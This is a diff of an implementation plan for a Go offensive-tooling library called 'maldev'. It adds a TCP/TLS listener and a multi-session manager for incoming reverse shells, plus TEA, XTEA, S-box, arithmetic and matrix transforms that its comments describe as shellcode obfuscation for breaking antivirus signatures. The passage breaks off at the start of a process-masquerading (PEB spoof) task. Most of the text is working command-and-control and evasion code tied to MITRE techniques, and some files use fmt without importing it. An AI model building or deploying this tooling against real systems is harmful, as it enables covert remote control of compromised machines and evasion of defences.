@@ -2663,6 +2663,1254 @@ git commit -m "docs: Sprint 2 technique pages — fakecmd, hideprocess, stealtho
 
 ---
 
+## Task 10: `c2/transport` — Listener Interface
+
+**Spec ref:** Sprint 2 Extensions design § A  
+**MITRE:** T1571 — Non-Standard Port
+
+**Files:**
+- Create: `c2/transport/listener.go`
+
+- [ ] **Step 1: Add Listener interface + implementations**
+
+```go
+// c2/transport/listener.go
+package transport
+
+import (
+    "context"
+    "crypto/tls"
+    "net"
+)
+
+// Listener is the server-side symmetric to Transport.
+// It accepts incoming connections from reverse-shell agents.
+type Listener interface {
+    // Accept blocks until a new connection arrives or ctx is cancelled.
+    Accept(ctx context.Context) (net.Conn, error)
+    // Close stops accepting new connections.
+    Close() error
+    // Addr returns the local address being listened on.
+    Addr() net.Addr
+}
+
+type tcpListener struct{ l net.Listener }
+
+// NewTCPListener creates a plain-TCP Listener on addr (e.g. "0.0.0.0:4444").
+func NewTCPListener(addr string) (Listener, error) {
+    l, err := net.Listen("tcp", addr)
+    if err != nil {
+        return nil, fmt.Errorf("tcp listen %s: %w", addr, err)
+    }
+    return &tcpListener{l: l}, nil
+}
+
+func (t *tcpListener) Accept(ctx context.Context) (net.Conn, error) {
+    // Use a goroutine so ctx cancellation unblocks Accept.
+    connCh := make(chan net.Conn, 1)
+    errCh  := make(chan error, 1)
+    go func() {
+        c, err := t.l.Accept()
+        if err != nil { errCh <- err; return }
+        connCh <- c
+    }()
+    select {
+    case c   := <-connCh: return c, nil
+    case err := <-errCh:  return nil, err
+    case <-ctx.Done():    t.l.Close(); return nil, ctx.Err()
+    }
+}
+func (t *tcpListener) Close() error        { return t.l.Close() }
+func (t *tcpListener) Addr() net.Addr      { return t.l.Addr() }
+
+type tlsListener struct{ l net.Listener }
+
+// NewTLSListener creates a TLS Listener using the provided *tls.Config.
+func NewTLSListener(addr string, cfg *tls.Config) (Listener, error) {
+    l, err := tls.Listen("tcp", addr, cfg)
+    if err != nil {
+        return nil, fmt.Errorf("tls listen %s: %w", addr, err)
+    }
+    return &tlsListener{l: l}, nil
+}
+
+func (t *tlsListener) Accept(ctx context.Context) (net.Conn, error) {
+    connCh := make(chan net.Conn, 1)
+    errCh  := make(chan error, 1)
+    go func() {
+        c, err := t.l.Accept()
+        if err != nil { errCh <- err; return }
+        connCh <- c
+    }()
+    select {
+    case c   := <-connCh: return c, nil
+    case err := <-errCh:  return nil, err
+    case <-ctx.Done():    t.l.Close(); return nil, ctx.Err()
+    }
+}
+func (t *tlsListener) Close() error   { return t.l.Close() }
+func (t *tlsListener) Addr() net.Addr { return t.l.Addr() }
+```
+
+- [ ] **Step 2: Build and commit**
+
+```
+go build $(go list ./...)
+git add c2/transport/listener.go
+git commit -m "feat(transport): add server-side Listener interface + TCP/TLS implementations"
+```
+
+---
+
+## Task 11: `c2/multicat` — Multi-Session Reverse Shell Manager
+
+**Spec ref:** Sprint 2 Extensions design § A  
+**MITRE:** T1571
+
+**Files:**
+- Create: `c2/multicat/doc.go`
+- Create: `c2/multicat/multicat.go`
+- Create: `c2/multicat/multicat_test.go`
+
+- [ ] **Step 1: Write failing tests**
+
+```go
+// c2/multicat/multicat_test.go
+package multicat_test
+
+import (
+    "context"
+    "io"
+    "net"
+    "strings"
+    "testing"
+    "time"
+
+    "github.com/oioio-space/maldev/c2/multicat"
+    "github.com/oioio-space/maldev/c2/transport"
+)
+
+// pipeListener wraps a channel of net.Conn to implement transport.Listener in tests.
+type pipeListener struct{ ch chan net.Conn }
+
+func (p *pipeListener) Accept(_ context.Context) (net.Conn, error) {
+    c, ok := <-p.ch
+    if !ok {
+        return nil, io.EOF
+    }
+    return c, nil
+}
+func (p *pipeListener) Close() error   { close(p.ch); return nil }
+func (p *pipeListener) Addr() net.Addr { return nil }
+
+func TestListenAccept(t *testing.T) {
+    ch := make(chan net.Conn, 2)
+    l  := &pipeListener{ch: ch}
+    mgr := multicat.New()
+
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+
+    go func() { _ = mgr.Listen(ctx, l) }()
+
+    // Simulate two agents connecting
+    serverA, clientA := net.Pipe()
+    serverB, clientB := net.Pipe()
+    ch <- serverA
+    ch <- serverB
+    _ = clientA; _ = clientB
+
+    time.Sleep(50 * time.Millisecond)
+
+    sessions := mgr.Sessions()
+    if len(sessions) != 2 {
+        t.Fatalf("want 2 sessions, got %d", len(sessions))
+    }
+}
+
+func TestSessionsIDSequential(t *testing.T) {
+    ch  := make(chan net.Conn, 3)
+    l   := &pipeListener{ch: ch}
+    mgr := multicat.New()
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+
+    go func() { _ = mgr.Listen(ctx, l) }()
+
+    for i := 0; i < 3; i++ {
+        s, c := net.Pipe()
+        ch <- s; _ = c
+    }
+    time.Sleep(50 * time.Millisecond)
+
+    var ids []string
+    for _, s := range mgr.Sessions() {
+        ids = append(ids, s.Meta.ID)
+    }
+    // IDs must be "1","2","3"
+    for i, id := range ids {
+        want := fmt.Sprintf("%d", i+1)
+        if id != want {
+            t.Errorf("session[%d].ID = %q, want %q", i, id, want)
+        }
+    }
+}
+
+func TestBannerHostname(t *testing.T) {
+    ch  := make(chan net.Conn, 1)
+    l   := &pipeListener{ch: ch}
+    mgr := multicat.New()
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+
+    go func() { _ = mgr.Listen(ctx, l) }()
+
+    server, client := net.Pipe()
+    ch <- server
+
+    // Agent sends banner
+    io.WriteString(client, "BANNER:WIN-TARGET\n")
+    time.Sleep(50 * time.Millisecond)
+
+    sessions := mgr.Sessions()
+    if len(sessions) != 1 {
+        t.Fatalf("want 1 session, got %d", len(sessions))
+    }
+    if sessions[0].Meta.Hostname != "WIN-TARGET" {
+        t.Errorf("hostname = %q, want WIN-TARGET", sessions[0].Meta.Hostname)
+    }
+}
+
+func TestRemoveSession(t *testing.T) {
+    ch  := make(chan net.Conn, 1)
+    l   := &pipeListener{ch: ch}
+    mgr := multicat.New()
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+
+    go func() { _ = mgr.Listen(ctx, l) }()
+
+    server, _ := net.Pipe()
+    ch <- server
+    time.Sleep(50 * time.Millisecond)
+
+    if err := mgr.Remove("1"); err != nil {
+        t.Fatal(err)
+    }
+    if len(mgr.Sessions()) != 0 {
+        t.Fatal("session not removed")
+    }
+}
+
+func TestEvents(t *testing.T) {
+    ch  := make(chan net.Conn, 1)
+    l   := &pipeListener{ch: ch}
+    mgr := multicat.New()
+    ctx, cancel := context.WithCancel(context.Background())
+    defer cancel()
+
+    go func() { _ = mgr.Listen(ctx, l) }()
+
+    server, _ := net.Pipe()
+    ch <- server
+
+    ev := <-mgr.Events()
+    if ev.Type != multicat.EventOpened {
+        t.Fatalf("want EventOpened, got %v", ev.Type)
+    }
+}
+```
+
+- [ ] **Step 2: Write doc.go**
+
+```go
+// c2/multicat/doc.go
+// Package multicat provides a multi-session reverse shell listener for operator use.
+//
+// It accepts incoming connections from reverse-shell agents (c2/shell), assigns each
+// a sequential session ID, and emits events over a channel. Sessions are held in memory;
+// they do not survive a manager restart.
+//
+// Wire protocol (BANNER): when an agent connects, multicat reads the first line with a
+// 500 ms deadline. If the line has the form "BANNER:<hostname>\n", the hostname is stored
+// in SessionMetadata. All other bytes are part of the normal shell I/O stream.
+//
+// Technique: Multi-handler / session multiplexing (operator-side only)
+// MITRE ATT&CK: T1571 — Non-Standard Port
+// Platform: Cross-platform
+// Detection: Low — package is never embedded in the implant.
+//
+// Example:
+//
+//  l, _ := transport.NewTCPListener(":4444")
+//  mgr := multicat.New()
+//  go mgr.Listen(ctx, l)
+//
+//  for ev := range mgr.Events() {
+//      if ev.Type == multicat.EventOpened {
+//          fmt.Printf("[+] %s from %s\n", ev.Session.Meta.ID, ev.Session.Meta.RemoteAddr)
+//      }
+//  }
+package multicat
+```
+
+- [ ] **Step 3: Write multicat.go**
+
+```go
+// c2/multicat/multicat.go
+package multicat
+
+import (
+    "bufio"
+    "context"
+    "fmt"
+    "net"
+    "strings"
+    "sync"
+    "sync/atomic"
+    "time"
+
+    "github.com/oioio-space/maldev/c2/transport"
+)
+
+const bannerDeadline = 500 * time.Millisecond
+const eventBufSize   = 64
+
+// EventType identifies what kind of session lifecycle event occurred.
+type EventType int
+
+const (
+    // EventOpened fires when a new agent connection is accepted.
+    EventOpened EventType = iota
+    // EventClosed fires when a session is closed (by Remove or connection EOF).
+    EventClosed
+)
+
+// SessionMetadata holds identifying information about a connected agent.
+type SessionMetadata struct {
+    // ID is a sequential integer string ("1", "2", ...).
+    ID          string
+    // RemoteAddr is the agent's network address.
+    RemoteAddr  net.Addr
+    // ConnectedAt is the wall-clock time of connection acceptance.
+    ConnectedAt time.Time
+    // Hostname is populated if the agent sends "BANNER:<hostname>\n" on connect.
+    Hostname    string
+}
+
+// Session represents one active reverse shell connection.
+// It implements io.ReadWriteCloser for direct operator ↔ agent I/O.
+type Session struct {
+    Meta   SessionMetadata
+    conn   net.Conn
+}
+
+func (s *Session) Read(p []byte) (int, error)  { return s.conn.Read(p) }
+func (s *Session) Write(p []byte) (int, error) { return s.conn.Write(p) }
+func (s *Session) Close() error                { return s.conn.Close() }
+
+// Event is emitted on the Manager.Events() channel for each session lifecycle change.
+type Event struct {
+    Type    EventType
+    Session *Session
+}
+
+// Manager multiplexes incoming reverse shell connections into named sessions.
+// All state is in-memory; sessions do not survive a restart.
+type Manager struct {
+    mu      sync.RWMutex
+    sessions map[string]*Session
+    counter  atomic.Int32
+    events   chan Event
+}
+
+// New creates an idle Manager ready to accept connections.
+func New() *Manager {
+    return &Manager{
+        sessions: make(map[string]*Session),
+        events:   make(chan Event, eventBufSize),
+    }
+}
+
+// Listen accepts connections from l until ctx is cancelled or l is closed.
+// Each accepted connection is handled in its own goroutine.
+func (m *Manager) Listen(ctx context.Context, l transport.Listener) error {
+    defer l.Close()
+    for {
+        conn, err := l.Accept(ctx)
+        if err != nil {
+            select {
+            case <-ctx.Done():
+                return nil
+            default:
+                return fmt.Errorf("multicat: accept: %w", err)
+            }
+        }
+        go m.handle(conn)
+    }
+}
+
+func (m *Manager) handle(conn net.Conn) {
+    id := fmt.Sprintf("%d", m.counter.Add(1))
+
+    meta := SessionMetadata{
+        ID:          id,
+        RemoteAddr:  conn.RemoteAddr(),
+        ConnectedAt: time.Now(),
+    }
+
+    // Try to read optional BANNER line within deadline.
+    conn.SetReadDeadline(time.Now().Add(bannerDeadline))
+    scanner := bufio.NewReader(conn)
+    line, err := scanner.ReadString('\n')
+    conn.SetReadDeadline(time.Time{}) // clear deadline
+    if err == nil && strings.HasPrefix(line, "BANNER:") {
+        meta.Hostname = strings.TrimSpace(strings.TrimPrefix(line, "BANNER:"))
+    }
+
+    sess := &Session{Meta: meta, conn: conn}
+
+    m.mu.Lock()
+    m.sessions[id] = sess
+    m.mu.Unlock()
+
+    m.emit(Event{Type: EventOpened, Session: sess})
+
+    // Block until the connection closes naturally (agent disconnects).
+    buf := make([]byte, 1)
+    for {
+        _, err := conn.Read(buf)
+        if err != nil {
+            break
+        }
+    }
+
+    m.mu.Lock()
+    delete(m.sessions, id)
+    m.mu.Unlock()
+
+    m.emit(Event{Type: EventClosed, Session: sess})
+}
+
+func (m *Manager) emit(ev Event) {
+    select {
+    case m.events <- ev:
+    default:
+        // Drop if nobody is consuming events — prevents blocking the goroutine.
+    }
+}
+
+// Events returns the channel on which session lifecycle events are delivered.
+func (m *Manager) Events() <-chan Event { return m.events }
+
+// Sessions returns a snapshot of all currently active sessions.
+func (m *Manager) Sessions() []*Session {
+    m.mu.RLock()
+    defer m.mu.RUnlock()
+    out := make([]*Session, 0, len(m.sessions))
+    for _, s := range m.sessions {
+        out = append(out, s)
+    }
+    return out
+}
+
+// Get returns the session with the given ID and whether it was found.
+func (m *Manager) Get(id string) (*Session, bool) {
+    m.mu.RLock()
+    defer m.mu.RUnlock()
+    s, ok := m.sessions[id]
+    return s, ok
+}
+
+// Remove closes the session's connection and removes it from the manager.
+// It emits EventClosed before returning. Returns an error if the session does not exist.
+func (m *Manager) Remove(id string) error {
+    m.mu.Lock()
+    sess, ok := m.sessions[id]
+    if !ok {
+        m.mu.Unlock()
+        return fmt.Errorf("multicat: session %q not found", id)
+    }
+    delete(m.sessions, id)
+    m.mu.Unlock()
+
+    sess.conn.Close()
+    m.emit(Event{Type: EventClosed, Session: sess})
+    return nil
+}
+```
+
+> **Note for implementer:** The `handle` goroutine reads one byte at a time to detect EOF — fine for sessions (shell I/O) since the real I/O goes through `sess.Read()`/`sess.Write()` by the operator. The EOF-detection loop is intentionally minimal.
+
+- [ ] **Step 4: Build, test, commit**
+
+```
+go build $(go list ./...)
+go test ./c2/multicat/...
+git add c2/multicat/
+git commit -m "feat(multicat): multi-session reverse shell listener + Listener interface"
+```
+
+---
+
+## Task 12: `crypto` — Lightweight Obfuscation (TEA, XTEA, ArithShift, SBox, Matrix)
+
+**Spec ref:** Sprint 2 Extensions design § B  
+**MITRE:** T1027 — Obfuscated Files or Information
+
+**Files:**
+- Create: `crypto/tea.go`
+- Create: `crypto/xtea.go`
+- Create: `crypto/arith.go`
+- Create: `crypto/sbox.go`
+- Create: `crypto/matrix.go`
+- Modify: `crypto/crypto_test.go`
+- Modify: `docs/techniques/crypto/payload-encryption.md`
+
+- [ ] **Step 1: Write failing tests (add to crypto/crypto_test.go)**
+
+```go
+func TestTEARoundtrip(t *testing.T) {
+    var key [16]byte
+    if _, err := rand.Read(key[:]); err != nil {
+        t.Fatal(err)
+    }
+    data := []byte("hello maldev TEA")
+    enc, err := crypto.EncryptTEA(key, data)
+    if err != nil {
+        t.Fatal(err)
+    }
+    dec, err := crypto.DecryptTEA(key, enc)
+    if err != nil {
+        t.Fatal(err)
+    }
+    if !bytes.Equal(dec, data) {
+        t.Fatalf("TEA roundtrip failed")
+    }
+}
+
+func TestXTEARoundtrip(t *testing.T) {
+    var key [16]byte
+    rand.Read(key[:])
+    data := []byte("hello maldev XTEA")
+    enc, _ := crypto.EncryptXTEA(key, data)
+    dec, _ := crypto.DecryptXTEA(key, enc)
+    if !bytes.Equal(dec, data) {
+        t.Fatalf("XTEA roundtrip failed")
+    }
+}
+
+func TestArithShiftRoundtrip(t *testing.T) {
+    key  := []byte("shiftkey")
+    data := []byte{0x00, 0xFF, 0x90, 0x48, 0x31, 0xC0}
+    enc, _ := crypto.ArithShift(data, key)
+    dec, _ := crypto.ReverseArithShift(enc, key)
+    if !bytes.Equal(dec, data) {
+        t.Fatalf("ArithShift roundtrip failed")
+    }
+}
+
+func TestSBoxRoundtrip(t *testing.T) {
+    sbox, inv, err := crypto.NewSBox()
+    if err != nil {
+        t.Fatal(err)
+    }
+    data := []byte{0x00, 0x01, 0xFE, 0xFF, 0x90}
+    enc  := crypto.SubstituteBytes(data, sbox)
+    dec  := crypto.ReverseSubstituteBytes(enc, inv)
+    if !bytes.Equal(dec, data) {
+        t.Fatalf("SBox roundtrip failed")
+    }
+}
+
+func TestMatrixTransformRoundtrip(t *testing.T) {
+    key, inv, err := crypto.NewMatrixKey(3)
+    if err != nil {
+        t.Fatal(err)
+    }
+    data := make([]byte, 27) // 3 * 3*3
+    for i := range data { data[i] = byte(i) }
+    enc, err := crypto.MatrixTransform(data, key)
+    if err != nil {
+        t.Fatal(err)
+    }
+    dec, err := crypto.ReverseMatrixTransform(enc, inv)
+    if err != nil {
+        t.Fatal(err)
+    }
+    if !bytes.Equal(dec, data) {
+        t.Fatalf("MatrixTransform roundtrip failed")
+    }
+}
+```
+
+- [ ] **Step 2: Implement crypto/tea.go**
+
+```go
+package crypto
+
+import (
+    "encoding/binary"
+    "fmt"
+)
+
+const (
+    teaDelta  = 0x9E3779B9
+    teaRounds = 64
+)
+
+// EncryptTEA encrypts data using TEA (Tiny Encryption Algorithm) with a 16-byte key.
+// Data is PKCS7-padded to a multiple of 8 bytes. Not cryptographically recommended
+// for high-security use — prefer AES/ChaCha20. Use for lightweight shellcode obfuscation.
+func EncryptTEA(key [16]byte, data []byte) ([]byte, error) {
+    padded := pkcs7Pad(data, 8)
+    out    := make([]byte, len(padded))
+    k0 := binary.LittleEndian.Uint32(key[0:4])
+    k1 := binary.LittleEndian.Uint32(key[4:8])
+    k2 := binary.LittleEndian.Uint32(key[8:12])
+    k3 := binary.LittleEndian.Uint32(key[12:16])
+    for i := 0; i < len(padded); i += 8 {
+        v0 := binary.LittleEndian.Uint32(padded[i:])
+        v1 := binary.LittleEndian.Uint32(padded[i+4:])
+        var sum uint32
+        for j := 0; j < teaRounds/2; j++ {
+            sum += teaDelta
+            v0 += ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1)
+            v1 += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3)
+        }
+        binary.LittleEndian.PutUint32(out[i:], v0)
+        binary.LittleEndian.PutUint32(out[i+4:], v1)
+    }
+    return out, nil
+}
+
+// DecryptTEA decrypts data previously encrypted with EncryptTEA.
+func DecryptTEA(key [16]byte, data []byte) ([]byte, error) {
+    if len(data)%8 != 0 {
+        return nil, fmt.Errorf("tea: ciphertext length %d not a multiple of 8", len(data))
+    }
+    out := make([]byte, len(data))
+    k0 := binary.LittleEndian.Uint32(key[0:4])
+    k1 := binary.LittleEndian.Uint32(key[4:8])
+    k2 := binary.LittleEndian.Uint32(key[8:12])
+    k3 := binary.LittleEndian.Uint32(key[12:16])
+    for i := 0; i < len(data); i += 8 {
+        v0 := binary.LittleEndian.Uint32(data[i:])
+        v1 := binary.LittleEndian.Uint32(data[i+4:])
+        sum := uint32(teaDelta * (teaRounds / 2))
+        for j := 0; j < teaRounds/2; j++ {
+            v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3)
+            v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1)
+            sum -= teaDelta
+        }
+        binary.LittleEndian.PutUint32(out[i:], v0)
+        binary.LittleEndian.PutUint32(out[i+4:], v1)
+    }
+    return pkcs7Unpad(out, 8)
+}
+
+// pkcs7Pad pads data to a multiple of blockSize using PKCS7.
+func pkcs7Pad(data []byte, blockSize int) []byte {
+    pad := blockSize - len(data)%blockSize
+    out := make([]byte, len(data)+pad)
+    copy(out, data)
+    for i := len(data); i < len(out); i++ {
+        out[i] = byte(pad)
+    }
+    return out
+}
+
+// pkcs7Unpad removes PKCS7 padding.
+func pkcs7Unpad(data []byte, blockSize int) ([]byte, error) {
+    if len(data) == 0 || len(data)%blockSize != 0 {
+        return nil, fmt.Errorf("pkcs7: invalid data length %d", len(data))
+    }
+    pad := int(data[len(data)-1])
+    if pad == 0 || pad > blockSize {
+        return nil, fmt.Errorf("pkcs7: invalid padding byte %d", pad)
+    }
+    return data[:len(data)-pad], nil
+}
+```
+
+- [ ] **Step 3: Implement crypto/xtea.go**
+
+```go
+package crypto
+
+import (
+    "encoding/binary"
+    "fmt"
+)
+
+const xteaRounds = 64
+
+// EncryptXTEA encrypts data using XTEA (eXtended TEA) with a 16-byte key.
+// XTEA fixes TEA's equivalent-key weakness. Same block size (8 bytes), PKCS7-padded.
+func EncryptXTEA(key [16]byte, data []byte) ([]byte, error) {
+    padded := pkcs7Pad(data, 8)
+    out    := make([]byte, len(padded))
+    var k [4]uint32
+    for i := range k {
+        k[i] = binary.LittleEndian.Uint32(key[i*4:])
+    }
+    for i := 0; i < len(padded); i += 8 {
+        v0 := binary.LittleEndian.Uint32(padded[i:])
+        v1 := binary.LittleEndian.Uint32(padded[i+4:])
+        var sum uint32
+        for j := 0; j < xteaRounds/2; j++ {
+            v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum&3])
+            sum += teaDelta
+            v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum>>11)&3])
+        }
+        binary.LittleEndian.PutUint32(out[i:], v0)
+        binary.LittleEndian.PutUint32(out[i+4:], v1)
+    }
+    return out, nil
+}
+
+// DecryptXTEA decrypts data previously encrypted with EncryptXTEA.
+func DecryptXTEA(key [16]byte, data []byte) ([]byte, error) {
+    if len(data)%8 != 0 {
+        return nil, fmt.Errorf("xtea: ciphertext length %d not a multiple of 8", len(data))
+    }
+    out := make([]byte, len(data))
+    var k [4]uint32
+    for i := range k {
+        k[i] = binary.LittleEndian.Uint32(key[i*4:])
+    }
+    for i := 0; i < len(data); i += 8 {
+        v0 := binary.LittleEndian.Uint32(data[i:])
+        v1 := binary.LittleEndian.Uint32(data[i+4:])
+        sum := uint32(teaDelta * (xteaRounds / 2))
+        for j := 0; j < xteaRounds/2; j++ {
+            v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum>>11)&3])
+            sum -= teaDelta
+            v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum&3])
+        }
+        binary.LittleEndian.PutUint32(out[i:], v0)
+        binary.LittleEndian.PutUint32(out[i+4:], v1)
+    }
+    return pkcs7Unpad(out, 8)
+}
+```
+
+- [ ] **Step 4: Implement crypto/arith.go**
+
+```go
+package crypto
+
+import "fmt"
+
+// ArithShift applies position-dependent arithmetic obfuscation:
+//   out[i] = (in[i] + key[i%len(key)] + byte(i)) & 0xFF
+//
+// Unlike XOR, identical input bytes produce different output due to the
+// position term, breaking simple frequency analysis.
+// Not cryptographic — use as a signature-breaking layer only.
+func ArithShift(data, key []byte) ([]byte, error) {
+    if len(key) == 0 {
+        return nil, fmt.Errorf("arith: key must not be empty")
+    }
+    out := make([]byte, len(data))
+    kl  := len(key)
+    for i, b := range data {
+        out[i] = b + key[i%kl] + byte(i)
+    }
+    return out, nil
+}
+
+// ReverseArithShift reverses ArithShift.
+func ReverseArithShift(data, key []byte) ([]byte, error) {
+    if len(key) == 0 {
+        return nil, fmt.Errorf("arith: key must not be empty")
+    }
+    out := make([]byte, len(data))
+    kl  := len(key)
+    for i, b := range data {
+        out[i] = b - key[i%kl] - byte(i)
+    }
+    return out, nil
+}
+```
+
+- [ ] **Step 5: Implement crypto/sbox.go**
+
+```go
+package crypto
+
+import (
+    "crypto/rand"
+    "fmt"
+)
+
+// NewSBox generates a random 256-byte S-Box (permutation of 0–255) and its inverse.
+// Used for non-linear byte substitution as a shellcode obfuscation layer.
+func NewSBox() (sbox [256]byte, inverse [256]byte, err error) {
+    // Start with identity, then Fisher-Yates shuffle.
+    for i := range sbox {
+        sbox[i] = byte(i)
+    }
+    b := make([]byte, 256)
+    if _, err = rand.Read(b); err != nil {
+        return sbox, inverse, fmt.Errorf("sbox: rand: %w", err)
+    }
+    for i := 255; i > 0; i-- {
+        j := int(b[i]) % (i + 1)
+        sbox[i], sbox[j] = sbox[j], sbox[i]
+    }
+    // Build inverse.
+    for i, v := range sbox {
+        inverse[v] = byte(i)
+    }
+    return sbox, inverse, nil
+}
+
+// SubstituteBytes applies a 256-byte substitution table to data.
+// The table must be a valid permutation of [0,255] for ReverseSubstituteBytes to work.
+func SubstituteBytes(data []byte, sbox [256]byte) []byte {
+    out := make([]byte, len(data))
+    for i, b := range data {
+        out[i] = sbox[b]
+    }
+    return out
+}
+
+// ReverseSubstituteBytes applies the inverse substitution table.
+func ReverseSubstituteBytes(data []byte, inverse [256]byte) []byte {
+    out := make([]byte, len(data))
+    for i, b := range data {
+        out[i] = inverse[b]
+    }
+    return out
+}
+```
+
+- [ ] **Step 6: Implement crypto/matrix.go (Agent Smith)**
+
+```go
+package crypto
+
+import (
+    "crypto/rand"
+    "fmt"
+)
+
+// NewMatrixKey generates a random n×n matrix invertible over GF(2^8) (mod 256).
+// n must be in [2, 4]. Returns the key matrix and its mod-256 inverse.
+//
+// Invertibility requires gcd(det(key), 256) == 1, which means det must be odd.
+// The function retries until this condition is met (typically < 10 attempts).
+func NewMatrixKey(n int) (key [][]byte, inverse [][]byte, err error) {
+    if n < 2 || n > 4 {
+        return nil, nil, fmt.Errorf("matrix: n must be 2, 3, or 4; got %d", n)
+    }
+    buf := make([]byte, n*n)
+    for attempt := 0; attempt < 1000; attempt++ {
+        if _, err = rand.Read(buf); err != nil {
+            return nil, nil, fmt.Errorf("matrix: rand: %w", err)
+        }
+        m := make([][]byte, n)
+        for i := range m {
+            m[i] = make([]byte, n)
+            copy(m[i], buf[i*n:])
+        }
+        det := matDet(m, n)
+        // det must be odd (coprime with 256) for mod-256 inverse to exist.
+        if det%2 != 0 {
+            inv, err := matInvMod256(m, n, det)
+            if err == nil {
+                return m, inv, nil
+            }
+        }
+    }
+    return nil, nil, fmt.Errorf("matrix: could not find invertible matrix after 1000 attempts")
+}
+
+// MatrixTransform pads data to a multiple of n² bytes and applies Hill-cipher-style
+// matrix multiplication mod 256 to each n-byte column vector.
+func MatrixTransform(data []byte, key [][]byte) ([]byte, error) {
+    n := len(key)
+    if n == 0 || len(key[0]) != n {
+        return nil, fmt.Errorf("matrix: key must be n×n, got irregular shape")
+    }
+    padded := pkcs7Pad(data, n)
+    out    := make([]byte, len(padded))
+    for i := 0; i < len(padded); i += n {
+        for row := 0; row < n; row++ {
+            var acc int
+            for col := 0; col < n; col++ {
+                acc += int(key[row][col]) * int(padded[i+col])
+            }
+            out[i+row] = byte(acc % 256)
+        }
+    }
+    return out, nil
+}
+
+// ReverseMatrixTransform applies the inverse key matrix to undo MatrixTransform.
+func ReverseMatrixTransform(data []byte, inverse [][]byte) ([]byte, error) {
+    n := len(inverse)
+    if n == 0 || len(inverse[0]) != n {
+        return nil, fmt.Errorf("matrix: inverse must be n×n")
+    }
+    if len(data)%n != 0 {
+        return nil, fmt.Errorf("matrix: data length %d not a multiple of n=%d", len(data), n)
+    }
+    out := make([]byte, len(data))
+    for i := 0; i < len(data); i += n {
+        for row := 0; row < n; row++ {
+            var acc int
+            for col := 0; col < n; col++ {
+                acc += int(inverse[row][col]) * int(data[i+col])
+            }
+            out[i+row] = byte(acc % 256)
+        }
+    }
+    return pkcs7Unpad(out, n)
+}
+
+// matDet computes the determinant of an n×n integer matrix (returns int for parity check).
+// Uses Leibniz formula for n<=4. Values are treated as unsigned bytes (0-255).
+func matDet(m [][]byte, n int) int {
+    switch n {
+    case 2:
+        return int(m[0][0])*int(m[1][1]) - int(m[0][1])*int(m[1][0])
+    case 3:
+        return int(m[0][0])*(int(m[1][1])*int(m[2][2])-int(m[1][2])*int(m[2][1])) -
+            int(m[0][1])*(int(m[1][0])*int(m[2][2])-int(m[1][2])*int(m[2][0])) +
+            int(m[0][2])*(int(m[1][0])*int(m[2][1])-int(m[1][1])*int(m[2][0]))
+    case 4:
+        // Cofactor expansion along first row.
+        det := 0
+        for col := 0; col < 4; col++ {
+            sign := 1
+            if col%2 != 0 {
+                sign = -1
+            }
+            det += sign * int(m[0][col]) * matDet(minor(m, 0, col, 4), 3)
+        }
+        return det
+    }
+    return 0
+}
+
+func minor(m [][]byte, skipRow, skipCol, n int) [][]byte {
+    sub := make([][]byte, n-1)
+    ri  := 0
+    for r := 0; r < n; r++ {
+        if r == skipRow {
+            continue
+        }
+        sub[ri] = make([]byte, n-1)
+        ci := 0
+        for c := 0; c < n; c++ {
+            if c == skipCol {
+                continue
+            }
+            sub[ri][ci] = m[r][c]
+            ci++
+        }
+        ri++
+    }
+    return sub
+}
+
+// matInvMod256 computes the mod-256 inverse of m using the adjugate method.
+// detVal must equal matDet(m, n). Returns error if modular inverse of det doesn't exist.
+func matInvMod256(m [][]byte, n, detVal int) ([][]byte, error) {
+    detMod := ((detVal % 256) + 256) % 256
+    detInv := modInverse256(detMod)
+    if detInv < 0 {
+        return nil, fmt.Errorf("matrix: det=%d has no mod-256 inverse", detMod)
+    }
+    // Build adjugate matrix.
+    adj := make([][]byte, n)
+    for i := range adj {
+        adj[i] = make([]byte, n)
+    }
+    for r := 0; r < n; r++ {
+        for c := 0; c < n; c++ {
+            sign := 1
+            if (r+c)%2 != 0 {
+                sign = -1
+            }
+            cofact := sign * matDet(minor(m, r, c, n), n-1)
+            // Transpose (adjugate = transpose of cofactor matrix).
+            v := ((cofact * detInv) % 256 + 256) % 256
+            adj[c][r] = byte(v)
+        }
+    }
+    return adj, nil
+}
+
+// modInverse256 returns x^-1 mod 256, or -1 if none exists (x must be odd).
+func modInverse256(x int) int {
+    // Extended Euclidean for mod 256.
+    a, b := x, 256
+    s, t := 1, 0
+    for b != 0 {
+        q := a / b
+        a, b = b, a-q*b
+        s, t = t, s-q*t
+    }
+    if a != 1 {
+        return -1
+    }
+    return ((s % 256) + 256) % 256
+}
+```
+
+- [ ] **Step 7: Update docs/techniques/crypto/payload-encryption.md**
+
+Add a new section "## Lightweight Obfuscation" before the API Reference section covering TEA, XTEA, ArithShift, SBox, MatrixTransform with usage snippets and when-to-use guidance. Update the comparison table to add rows for new algorithms.
+
+- [ ] **Step 8: Build, test, commit**
+
+```
+go build $(go list ./...)
+go test ./crypto/...
+git add crypto/ docs/techniques/crypto/
+git commit -m "feat(crypto): TEA, XTEA, ArithShift, SBox, Agent Smith matrix transform"
+```
+
+---
+
+## Task 13: `evasion/fakecmd` — Remote Process PEB Spoof (`SpoofPID`)
+
+**Spec ref:** Sprint 2 Extensions design § C  
+**MITRE:** T1036.005
+
+**Files:**
+- Modify: `evasion/fakecmd/fakecmd_windows.go`
+- Modify: `evasion/fakecmd/fakecmd_windows_test.go`
+- Modify: `docs/techniques/evasion/fakecmd.md`
+
+- [ ] **Step 1: Write failing test**
+
+```go
+// In evasion/fakecmd/fakecmd_windows_test.go
+func TestSpoofPID(t *testing.T) {
+    testutil.RequireAdmin(t)
+
+    // Spawn a sacrificial process.
+    proc := exec.Command("notepad.exe")
+    if err := proc.Start(); err != nil {
+        t.Skipf("cannot start notepad.exe: %v", err)
+    }
